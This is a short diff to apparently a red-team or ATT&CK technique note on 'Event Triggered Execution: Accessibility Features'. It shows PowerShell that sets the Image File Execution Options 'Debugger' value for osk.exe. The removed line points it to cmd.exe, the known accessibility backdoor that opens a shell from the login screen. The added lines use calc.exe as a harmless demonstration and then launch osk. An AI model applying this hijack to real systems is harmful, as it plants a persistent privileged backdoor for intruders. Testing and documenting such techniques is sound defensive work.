@@ -5,7 +5,9 @@ Event Triggered Execution: Accessibility Features
 POWERSHELL!!!!!!!!!!!!!!
 ----------------------------------------------------------
 
-New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" -Name "Debugger" -Value "cmd.exe" -PropertyType STRING -Force
+New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe"
+New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" -Name "Debugger" -Value "calc.exe" -PropertyType STRING -Force
+osk
 
 ----------------------------------------------------------
 
